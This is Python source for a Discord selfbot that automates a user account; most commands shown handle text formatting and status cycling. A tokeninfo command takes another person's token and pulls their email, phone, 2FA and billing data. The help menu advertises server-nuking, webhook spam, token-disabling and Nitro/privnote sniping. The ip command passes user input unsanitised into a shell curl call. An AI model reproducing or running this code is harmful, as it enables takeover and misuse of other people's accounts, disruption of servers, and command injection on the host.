from __future__ import unicode_literals

import os



try:
    import sys
except:
    os.system("pip install sys")
    import sys

import time
try:
    import requests
except:
    os.system("pip install requests")
    import requests

try:
    import json
except:
    os.system("pip install json")
    import json

try:
    import ctypes
except:
    os.system("pip install ctypes")
    import ctypes





try:
    from halo import Halo
except:
    os.system("pip install halo")
    from halo import Halo


try:
    import discord
except:
    os.system("pip install discord")
    import discord

try:
    import random


 #should be preinstalled
except:
    os.system("pip install random")
    import random





    


try:
    import asyncio
except:
    os.system("pip install asyncio")
    import asyncio


try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil


    
try:
    import threading
except:
    os.system("pip install threading")
    import threading

try:
    from datetime import datetime
except:
    os.system("pip install datetime")
    from datetime import datetime

try:
    import base64
except:
    os.system("pip install base64")
    import base64

import re

try:
    from win10toast import ToastNotifier
except:
    os.system("pip install win10toast")
    from win10toast import ToastNotifier

try:
    from colorama import init, Fore, Back, Style
except:
    os.system("pip install colorama")
    from colorama import init, Fore, Back, Style

init(convert=True)

try:
    import string
except:
    os.system("pip install string")
    import string

try:
    from PIL import Image
except:
    os.system("pip install pillow")
    from PIL import Image

from discord.ext import commands



characters = string.ascii_letters + string.digits

os.system("cls")
os.system("mode 100,30")
os.system("title Scalic Selfbot - Please remember to star it - it took hours and I've released the source!")
#Notice - this bot is a selfbot to have some fun with.Selfbots are against discords tos and are not to be used - it's a proof of concept
# I'm fine with people learning from code. I originally learnt by finding scripts on github and changing things round to learn which part was doing which, but I am not a fan on people taking credit for other peoples work.
#If you feel like you have to change things like channel creation to say your name or whatever that's fine, but I'd really appreciate it if you don't change the footers on messages, this way other people can find out about my bot and use it
#Please don't sell my work either. It took ages and to give the source code out for free is kind, making money off my free work is just wrong
#This took lots of hours to work on. Signing up to github takes about 3 minutes max, starring my post  - https://github.com/scalic/scalic-selfbot - takes 5 seconds. If you wouldn't mind pressing the star I'd really appreciate it!
#Have fun :)




#Also to do - if lots of people get "member not found errors", fetch the member for each cmd thats interactive with others (just time consuming adding it)
try:
    with open("settings.txt") as setup:
        setup = setup.readlines()

except Exception as error:
    print(f" | Did you extract me properly? Did you delete/rename settings.txt? I can't access it\n | Error : {error}")
    time.sleep(10)
    os._exit(0)

token = setup[0].replace('"',"").replace("TOKEN=","") #Removing the "" helps - some users will get their token from local storage which will lead to this I also know some people would probably delete the bit that says TOKEN= so did a foolproof way :)
#print(token)


spinner = Halo(
    text=' | Scalic Selfbot - Loading',
    spinner={
        'interval': 250,
        'frames': ['.', '..', '...']
    }
)
spinner.start()
sooo = requests.get('https://discordapp.com/api/v8/users/@me', headers={'Authorization': token.strip()})


if sooo.status_code == 200:
    spinner.succeed(' | Token valid - Starting up selfbot')    


else:
    spinner.stop()
    os.system("cls")

    print(' | Invalid token. Put a valid token in settings.txt') 
    try:
        j = json.loads(sooo.text)
        errormessage = j['message']
        print(f" | Error : {errormessage}")
    except:
        pass
    time.sleep(5)
    os._exit(0)

    #when doing the commands, you can change the default settings. It won't change it here, it's not a bug, it's how I like it :)
prefix = setup[1].replace('"',"").replace("PREFIX=","") #just in case users put the details in " "
editing = setup[2].replace('"',"").replace("EDIT=","")
deletedmessagelogging = setup[3].replace('"',"").replace("DELETED-MESSAGE-LOGGER=","")
editedmessagelogging = setup[4].replace('"',"").replace("EDITED-MESSAGE-LOGGER=","")
nitrosnipe = setup[5].replace('"',"").replace("NITRO-SNIPE=","")
privnotesnipe = setup[6].replace('"',"").replace("PRIVNOTE-SNIPE=","")
giveawaysnipe = setup[7].replace('"',"").replace("GIVEAWAY-SNIPE=","")
pastebinsnipe = setup[8].replace('"',"").replace("PASTEBIN-SNIPE=","")
deleteafter = setup[9].replace('"',"").replace("DELETE-AFTER=","")
deleteaftertime = setup[10].replace('"',"").replace("DELETE-AFTER-TIME=","")
delaybetweencycle = setup[11].replace('"',"").replace("CYCLEDELAY=","")
statusdata = setup[12].replace('"',"").replace("STATUSCYCLE=","")
streamurl = setup[13].replace('"',"").replace("STREAMURL=","")
delaybetweennicknamecycle = setup[14].replace('"',"").replace("NICKNAMECYCLEDELAY=","")
nicknamedata = setup[15].replace('"',"").replace("NICKNAMECYCLE=","")
talkingcuteyems = setup[16].replace('"',"").replace("TALKCUTE=","")
isafk = setup[17].replace('"',"").replace("AFK=","")
messagetosendwhenafk = setup[18].replace('"',"").replace("AFKMSG=","")
notifsyems = setup[19].replace('"',"").replace("NOTIFICATIONS-ON-PING=","")
#looking back idk what i was thinking doing this. I know and want to switch to a json config but it's kinda complicated especially with how the code relies on certain bits so errr yes

#might switch this to an env file but I've done stuff like that before and like 9% of people knew how to load it - this is more foolproof

statusofediting = editing.strip().lower()
deletedmessagelogger = deletedmessagelogging.strip().lower()
editedmessagelogger = editedmessagelogging.strip().lower()

nitrosniping = nitrosnipe.strip().lower()
privnotesniping = privnotesnipe.strip().lower()
giveawaysniping = giveawaysnipe.strip().lower()
pastebinsniping = pastebinsnipe.strip().lower()

delaybetweencycle = delaybetweencycle.strip()
statusdata = statusdata.strip()
statusdata = statusdata.split(",")

delaybetweennicknamecycle = delaybetweennicknamecycle.strip()
nicknamedata = nicknamedata.strip()
nicknamedata = nicknamedata.split(",")

deleteafter = deleteafter.strip().lower()
deleteaftertime = deleteaftertime.strip().lower()

talkingcuteyems = talkingcuteyems.strip().lower()
isafk = isafk.strip().lower()
messagetosendwhenafk = messagetosendwhenafk.strip()

notifsyems = notifsyems.strip().lower()

scalic = commands.Bot(prefix.strip(), self_bot=True)
scalic.remove_command("help") #this lets me add my own custom help cmd, rather then the ugly default one

editedmessages ={}

spinner = Halo(
    text=' | Scalic Selfbot - Connecting',
    spinner={
        'interval': 250,
        'frames': ['.', '..', '...']
    }
)
spinner.start()






#Cmd list that I think need improving

#Edit snipe - always returns that no messages were found - messages do seem to be stored Successfully

#Deleted message sniper - just a reminder of the cmd for me for once I find out why edit sniping is broken



#tiktok cmd to type !tiktok [url] - it then sends video source - adds a reaction and when the user REMOVES that reaction (aka clicks it) itll download it - lemme know if u can help with this

commandsdone = 0
messagessent = 0



def screen():
    global commandsdone
    global messagessent
    global accountsinprogress
    global tokensmade
    global errorsoccured
    global starttime
    os.system("cls")

    while True:
        os.system("mode 100,30")
        currenttime = time.time()
        timedata = currenttime-starttime
        hours = timedata//3600
        timedata = timedata - 3600*hours
        minutes = timedata//60
        seconds = timedata - 60*minutes
        os.system(f"title Scalic Selfbot - Running on {scalic.user.name} - Enjoy")
        logo = f"""



				        {Fore.WHITE}Connected To : {Fore.WHITE}[{Fore.RED}{scalic.user.name}#{scalic.user.discriminator}{Fore.WHITE}]




				        Messages Sent : {Fore.WHITE}[{Fore.RED}{messagessent}{Fore.WHITE}]




				        Commands Used : {Fore.WHITE}[{Fore.RED}{commandsdone}{Fore.WHITE}]




				        Total Guilds : {Fore.WHITE}[{Fore.RED}{len(scalic.guilds)}{Fore.WHITE}]




				        Time Elapsed : {Fore.WHITE}[{Fore.RED}{'%d:%d:%d' %(hours,minutes,seconds)}{Fore.WHITE}]




        """#accounts remaining and accounts total add to ui not sure accounts making per thread
        #name of accs make



        print(logo)
        time.sleep(1)
        os.system("cls")

@scalic.command(aliases=['color', 'colour',"colourinfo","hex"])
async def colorinfo(ctx,hexcolor=None):
    additionalinfo = ""
    if hexcolor == None:
        hexcolor = random.randint(0x000000, 0xFFFFFF)
        additionalinfo = additionalinfo + "- I picked a random color for you since you didn't specify one"
    data = requests.get(f"https://www.thecolorapi.com/id?hex={hexcolor}").text
    j = json.loads(data)
    rgbdata = j['rgb']

    a = str(rgbdata).split("},")[1]
    
    embed=discord.Embed(title=f"Details on hex color #{hexcolor} {additionalinfo}", description=a.split(", 'value': 'rgb")[0], color=int(hexcolor))
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)


@scalic.command(aliases=["poll"])
async def suggest(ctx,*,message="Supply something to suggest lol!"):
    await ctx.message.delete()
    randcolor = random.randint(0x000000, 0xFFFFFF) 
    try:
        embed=discord.Embed(title=f"Scalic selfbot - poll", description=f"Poll message : `{message}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        a = await ctx.send(embed=embed)
    except:
        a = await ctx.send(message)


    await a.add_reaction("👍")
    await a.add_reaction("👎")


@scalic.command(aliases=["shrugging"])
async def shrug(ctx,*,message=""):
    await ctx.message.edit(content=f"{message} ¯\_(ツ)_/¯")

@scalic.command(aliases=["tableflip","flip"])
async def fliptable(ctx,*,message=""):
    await ctx.message.edit(content=f"{message} (╯°□°）╯︵ ┻━┻")

@scalic.command(aliases=["untableflip","tableunflip","unfliptable"])
async def unflip(ctx,*,message=""):
    await ctx.message.edit(content=f"{message} (╯°□°）╯︵ ┳━┳")

@scalic.command(aliases=["tw"])
async def spoiler(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"||{message}||")

@scalic.command(aliases=["ul","line"])
async def underline(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"__{message}__")

@scalic.command()
async def bold(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"**{message}**")

@scalic.command()
async def italic(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"_{message}_")

@scalic.command()
async def block(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```\n{message}```")

#Shoutout to https://www.writebots.com/discord-text-formatting/

@scalic.command(aliases=["redblock"])
async def redtext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```diff\n- {message}```")

@scalic.command(aliases=["orangeblock"])
async def orangetext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```css\n[{message}]```")

@scalic.command(aliases=["yellowblock"])
async def yellowtext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```fix\n{message}```")

@scalic.command(aliases=["greenblock"])
async def greentext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```diff\n+{message}```")

@scalic.command(aliases=["lightgreenblock"])
async def lightgreentext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```css\n\"{message}\"```")

@scalic.command(aliases=["cyanblock"])
async def cyantext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```json\n\"{message}\"```")  

@scalic.command(aliases=["blueblock"])
async def bluetext(ctx,*,message="I don't know how to supply a message LOL!!!!!!!!"):
    await ctx.message.edit(content=f"```ini\n[{message}]```")




###
@scalic.command(aliases=["encode","base64","base64encode","encodebase64"])
async def encrypt(ctx,*,message="woah top quality encryption no one will ever see this im telling u"):
    msg = base64.b64encode(str(message).encode())
    final = str(msg).replace("'","")
    await ctx.message.edit(content=f"`{final[1:]}`")

@scalic.command(aliases=["decode","base64decode","decodebase64"])
async def decrypt(ctx,*,message="d29haCB0b3AgcXVhbGl0eSBlbmNyeXB0aW9uIG5vIG9uZSB3aWxsIGV2ZXIgc2VlIHRoaXMgaW0gdGVsbGluZyB1"):
    msg = base64.b64decode(str(message).encode())
    final = str(msg).replace("'","")
    await ctx.message.edit(content=f"`{final[1:]}`")


    

@scalic.command(aliases=["iplocate","locateip","ipgeolocate"])
async def ip(ctx, *, iparg="1.1.1.1"):

    await ctx.message.delete()


    personalip = requests.get("https://api64.ipify.org/?format=text").text #going to double check to attempt not to send our own ip


    data = str(os.popen(f"curl -s http://ip-api.com/json/{iparg}").read())
    data = json.loads(data)
    content = []
    for da in data:
        content.append(f"{str(da)} : {str(data[da])}")
    desc = ""
    for e in content:
        desc = desc + f"{e}\n"

    randcolor = random.randint(0x000000, 0xFFFFFF) 
    if personalip in desc:
        
        embed=discord.Embed(title=f"Scalic selfbot - ip locator", description="Your ip was detected in this data - to double check that your ok with showing the data\npress the reaction button below!", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        message = await ctx.send(embed=embed)        
        await message.add_reaction('✅')      
        reactionstuffyes = True
        def requirements(reaction, user):
            return user == ctx.author and str(reaction.emoji) in ('✅') and message==message

        randcolor = random.randint(0x000000, 0xFFFFFF)
        while reactionstuffyes:
            try:
                reaction, user = await scalic.wait_for('reaction_remove', timeout=10, check=requirements)
                embed=discord.Embed(title=f"Scalic selfbot - ip locator", description=desc, color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                reactionstuffyes= False   

                await message.edit(embed=embed)


            except asyncio.TimeoutError:
                embed=discord.Embed(title=f"Scalic selfbot - Ip locator", description="You took too long to react - try running this command again or sum", color=randcolor)
                embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
                embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
                await message.edit(embed=embed)
                
                await message.clear_reactions()
                reactionstuffyes= False   

    else:
            embed=discord.Embed(title=f"Scalic selfbot - Ip locator", description=desc, color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.send(embed=embed)


@scalic.command(aliases=["infotoken"])
async def tokeninfo(ctx, bokenxd):
    await ctx.message.delete()
    data = requests.get('https://discordapp.com/api/v6/users/@me', headers={'Authorization': bokenxd,'Content-Type': 'application/json'})

    if data.status_code == 200: 

    # user info
        j = data.json()
        # I had something in my folder that helped me with this, if you know who owns the code of subscription data lemme know so I can add credit stuff
        name = f'{j["username"]}#{j["discriminator"]}'
        userid = j['id']
        avatar = f"https://cdn.discordapp.com/avatars/{j['id']}/{j['avatar']}.webp"
        phone = j['phone']
        isverified = j['verified']
        email = j['email']
        twofa = j['mfa_enabled']
        flags = j['flags']
        creation_date = datetime.utcfromtimestamp(((int(userid) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title=f"Scalic selfbot - Token info", description=f"Token info:\nUser : `{name}`\nUser-id : `{userid}`\nAvatar url : `{avatar}`\nPhone number linked : `{phone}`\nEmail verification status : `{isverified}`\nEmail linked : `{email}`\n2f/a Status : `{twofa}`\nFlags : `{flags}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        message = await ctx.send(embed=embed)

        has_nitro = False
        datahmm = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers={'Authorization': bokenxd,'Content-Type': 'application/json'})
        nitro_data = datahmm.json()
        nitroyems = bool(len(nitro_data) > 0)
        if nitroyems:
            end = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            start = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
            totalnitro = abs((start - end).days)
            embed=discord.Embed(title=f"Scalic selfbot - Token info", description=f"Token info:\nUser : `{name}`\nUser-id : `{userid}`\nAvatar url : `{avatar}`\nPhone number linked : `{phone}`\nEmail verification status : `{isverified}`\nEmail linked : `{email}`\n2f/a Status : `{twofa}`\nFlags : `{flags}`\n\nNitro Data:\nHad nitro since : `{end}`\nNitro ends on : `{start}`\nTotal nitro : `{totalnitro}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await message.edit(embed=embed)
    else:
        embed=discord.Embed(title=f"Scalic selfbot - Token info", description=f"Site responded with status code : `{data.status_code}`\nMessage : `{data.text}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.send(embed=embed)


@scalic.command(aliases=['pong', 'latency'])
async def ping(ctx,afkstatus=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"Scalic selfbot - ping pong ping pong ping pong ping pong ping pong ping pong ping pong ping pong ping pong ping pong", description=f'🏓 pong | {round(scalic.latency * 1000)}ms', color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.send(embed=embed)


@scalic.command(aliases=['commands', 'commandlist',"commandslist","allcommands","h"])
async def help(ctx,helpcategory="none"):
    await ctx.message.delete()
    helpcategory = helpcategory.lower().replace("[","").replace("]","") 
    if helpcategory == "none":
        description =f"""
There are **lots** of commands.

To avoid clutter - each command is split into categories.

Categories : `System` , `Utility` , `Emoji` , `Moderation` , `Snipe` , `Nuke` , `Fun` , `Text`.

Type `{prefix.strip()}help [category]` for information on its commands


"""

    elif "system" in helpcategory:
        description =f"""
**🖥️ System Commands**

`{prefix.strip()}help [category]`
`{prefix.strip()}download`
`{prefix.strip()}ping`
`{prefix.strip()}notifications [on/off]`
`{prefix.strip()}logout`

"""
    if "utility" in helpcategory:
        description =f"""
**⚙️ Utility Commands**

`{prefix.strip()}afk [on/off]`
`{prefix.strip()}afkmsg [message]`
`{prefix.strip()}edit [on/off]`
`{prefix.strip()}talkcute [on/off]`
`{prefix.strip()}logdeletedmessages [on/off]`
`{prefix.strip()}logediteddmessages [on/off]`
`{prefix.strip()}deletemessagesafter [on/off]`
`{prefix.strip()}timetodeleteafter [seconds]`
`{prefix.strip()}cycledelay [seconds]`
`{prefix.strip()}watch [status]`
`{prefix.strip()}watchcycle`
`{prefix.strip()}listen [status]`
`{prefix.strip()}listencycle`
`{prefix.strip()}game [status]`
`{prefix.strip()}gamecycle`
`{prefix.strip()}stream [status]`
`{prefix.strip()}streamcycle`
`{prefix.strip()}twitchurl [twitch-url for stream status]`
`{prefix.strip()}biocycle`
`{prefix.strip()}nicknamecycle`
`{prefix.strip()}nicknamecycledelay [seconds]`
`{prefix.strip()}userinfo [user]`
`{prefix.strip()}serverinfo`
`{prefix.strip()}autolevel`
`{prefix.strip()}autobump`
`{prefix.strip()}uptime`
`{prefix.strip()}avatar`
`{prefix.strip()}downloadavatar`
`{prefix.strip()}purge [amount]`
`{prefix.strip()}dmclear`
`{prefix.strip()}backup`
`{prefix.strip()}urbandictionary [word]`
`{prefix.strip()}embed [message]`
`{prefix.strip()}colorinfo [hex-color]`
`{prefix.strip()}bitcoin`
`{prefix.strip()}suggest [suggestion]`
`{prefix.strip()}hypesquad [bravery/brilliance/balance]`
`{prefix.strip()}idtoname [id]`
`{prefix.strip()}invite`
`{prefix.strip()}ip [ip-to-locate]`
`{prefix.strip()}join [invite]`
`{prefix.strip()}leave [server-id]`
`{prefix.strip()}tinyurl [url]`




"""
    elif "emoji" in helpcategory:
        description =f"""
**😎  Emoji Commands**

`{prefix.strip()}addemoji [emoji]`
`{prefix.strip()}bigemoji [emoji]`
`{prefix.strip()}downloadguildemojis [guild-id]`
`{prefix.strip()}stealguildemoji [guild-id]`

"""    

    elif "moderation" in helpcategory:
        description =f"""
**🔨 Moderation Commands**

`{prefix.strip()}kick [user]`
`{prefix.strip()}ban [user]`
`{prefix.strip()}banid [user-id]`
`{prefix.strip()}unban [user-id]`
`{prefix.strip()}clearcontent [amount,content]`
`{prefix.strip()}nuke`


"""    
    elif "snipe" in helpcategory:
        description =f"""
**🔫 Snipe Commands**

`{prefix.strip()}snipe`
`{prefix.strip()}nitrosnipe [on/off]`
`{prefix.strip()}giveawaysnipe [on/off]`
`{prefix.strip()}pastebinsnipe [on/off]`
`{prefix.strip()}privnotesnipe [on/off]`


"""   

    elif "nuke" in helpcategory:
        description =f"""
**☢️ Nuke Commands**

`{prefix.strip()}channelspam [amount,name]`
`{prefix.strip()}deletechannels`
`{prefix.strip()}rolespam [amount,name]`
`{prefix.strip()}deleteroles`
`{prefix.strip()}emojinuke`
`{prefix.strip()}webhookspam`
`{prefix.strip()}stopwebhookspam`
`{prefix.strip()}webhookdelete [webhook]`
`{prefix.strip()}tokeninfo [token]`
`{prefix.strip()}tokendisable [token]`
`{prefix.strip()}fucktoken [token]`


"""   


    elif "fun" in helpcategory:
        description =f"""
**🤣 Fun Commands**

`{prefix.strip()}ascii [word]`
`{prefix.strip()}name [name]`
`{prefix.strip()}nitro`
`{prefix.strip()}impersonate [user] [message]`
`{prefix.strip()}www [user]`
`{prefix.strip()}stickbug [user]`
`{prefix.strip()}tweet [user] [message]`
`{prefix.strip()}blurpify [user]`
`{prefix.strip()}magic [user]`
`{prefix.strip()}deepfry [user]`
`{prefix.strip()}captcha [user]`
`{prefix.strip()}threat [user]`
`{prefix.strip()}iphone [user]`
`{prefix.strip()}ship [user]`
`{prefix.strip()}kannagen [text]`
`{prefix.strip()}changemymind [opinion]`
`{prefix.strip()}clyde [message]`
`{prefix.strip()}encrypt [message]`
`{prefix.strip()}decrypt [message]`
`{prefix.strip()}tokenhalf [user]`
`{prefix.strip()}vcspam [vc-id-one] [vc-id-two] [user-id] [amount]`
`{prefix.strip()}spampin [amount]`
`{prefix.strip()}spamreact [amount] [reaction]`
`{prefix.strip()}spamedit [amount] [new-message]`
`{prefix.strip()}spam [amount] [message]`
`{prefix.strip()}embedspam [amount] [new-message]`
`{prefix.strip()}qr [message]`
`{prefix.strip()}mimic [user]`
`{prefix.strip()}joke`


"""   

    elif "text" in helpcategory:
        description =f"""
**📝 Text Commands**

`{prefix.strip()}block [text]`
`{prefix.strip()}redtext [text]`
`{prefix.strip()}orangetext [text]`
`{prefix.strip()}yellowtext [text]`
`{prefix.strip()}lightgreentext [text]`
`{prefix.strip()}greentext [text]`
`{prefix.strip()}cyantext [text]`
`{prefix.strip()}bluetext [text]`
`{prefix.strip()}bold [text]`
`{prefix.strip()}underline [text]`
`{prefix.strip()}spoiler [text]`
`{prefix.strip()}italic [text]`
`{prefix.strip()}shrug [text]`
`{prefix.strip()}fliptable [text]`
`{prefix.strip()}unfliptable [text]`
`{prefix.strip()}hastebin [text]`
    
"""   



    embed=discord.Embed(title=f"Scalic Selfbot", description=description, color=0x36393f)
    await ctx.send(embed=embed)






@scalic.command(aliases=['afkoff', 'afkon'])
async def afk(ctx,afkstatus=None):
    global isafk 

    print(ctx.message.content)
    if ctx.message.content == f"{prefix.strip()}afkoff":
        isafk = "off"

    elif ctx.message.content == f"{prefix.strip()}afkon":
        isafk = "on"

    elif afkstatus == None:
        if isafk == "off":
            isafk = "on"
        elif isafk == "on":
            isafk = "off"
    else:
        if afkstatus.lower() == "off":
            isafk = "off"
        if afkstatus.lower() == "on":
            isafk = "on"

        if afkstatus.lower() == "true":
            isafk = "on"
        if afkstatus.lower() == "false":
            isafk = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Afk auto messager", description=f"Afk messages are now : `{isafk}`\nTry {prefix.strip()}afkmessage [message]", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['afkmessage', 'afkmessageedit'])
async def afkmsg(ctx,*,afkstatus="I'm afk , wait for me to reply"):
    global messagetosendwhenafk 

    messagetosendwhenafk = afkstatus

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Afk auto messager", description=f"Afk messages are : `{isafk}`\nAfk message is : `{messagetosendwhenafk}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=["timerunning","elapsed"])
async def uptime(ctx):
    global starttime
    currenttime = time.time()
    timedata = currenttime-starttime
    hours = timedata//3600
    timedata = timedata - 3600*hours
    minutes = timedata//60
    seconds = timedata - 60*minutes
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Uptime", description=f"Scalic has been running for `{'%d:%d:%d' %(hours,minutes,seconds)}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)


@scalic.command(aliases=["cylegame","cyclegamestatus","gamestatuscycle"])
async def gamecycle(ctx):
    global statusdata
    global delaybetweencycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Game Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)
    while True:
        for gamestatus in statusdata:
            await scalic.change_presence(status=discord.Status.online, activity=discord.Game(name=gamestatus))
            await asyncio.sleep(int(delaybetweencycle)) 

@scalic.command(aliases=["cyclestatus","statuscycle","cyclebio"])
async def biocycle(ctx):
    global statusdata
    global delaybetweencycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Bio Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)
    headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}
    while True:
        for biostatus in statusdata:
            requests.patch("https://discord.com/api/v8/users/@me/settings",headers=headers,json={"custom_status":{"text":biostatus}})
            await asyncio.sleep(int(delaybetweencycle)) 


    

@scalic.command(aliases=["cyclewatch","cyclewatchstatus","watchstatuscycle","cyclewatchingstatus","cyclewatching","watchingcycle"])
async def watchcycle(ctx):
    global statusdata
    global delaybetweencycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Watch Cycle", description=f"Cycling these statuses:\n`{statusdata}`\nDelay:\n`{delaybetweencycle}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)
    while True:
        for watchstatus in statusdata:
            await scalic.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=watchstatus))
            await asyncio.sleep(int(delaybetweencycle)) 

@scalic.command(aliases=["nickcycle","cyclenick","cyclenickname","cyclenicknames","nicknamescycle","nicknames","nickname"])
async def nicknamecycle(ctx,statustocycle=None):
    global nicknamedata
    global nicknamestuffyes
    global delaybetweennicknamecycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if statustocycle == None or statustocycle.lower() == "yes" or statustocycle.lower() == "on":
        nicknamestuffyes = "on"
        
        embed=discord.Embed(title="Scalic Selfbot - Nickname Cycle", description=f"Cycling these statuses:\n`{nicknamedata}`\nDelay:\n`{delaybetweennicknamecycle}`\nCycle status : `{nicknamestuffyes}`\n{prefix.strip()}nicknamecycle off **to stop the cycle** \nAlso try {prefix.strip()}nicknamecycledelay ", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)
        while nicknamestuffyes == "on":
            for nick in nicknamedata:
                await ctx.message.author.edit(nick=nick)     
                await asyncio.sleep(int(delaybetweennicknamecycle)) 

    else:
        nicknamestuffyes = "off"
        embed=discord.Embed(title="Scalic Selfbot - Nickname Cycle", description=f"Cycle status : `{nicknamestuffyes}`\n{prefix.strip()}nicknamecycle **to start the cycle**", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)


@scalic.command(aliases=["nickdelay","nicknamedelay","delaynicks","delaynick","delaynicknames","addnicknamedelay","changenicknamedelay"])
async def nicknamecycledelay(ctx,newdelay="5"):
    global delaybetweennicknamecycle
    randcolor = random.randint(0x000000, 0xFFFFFF)
    delaybetweennicknamecycle = int(newdelay)
    embed=discord.Embed(title="Scalic Selfbot - Nickname Delay", description=f"Delay is now : `{delaybetweennicknamecycle} seconds`\n{prefix.strip()}nicknamecycle", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

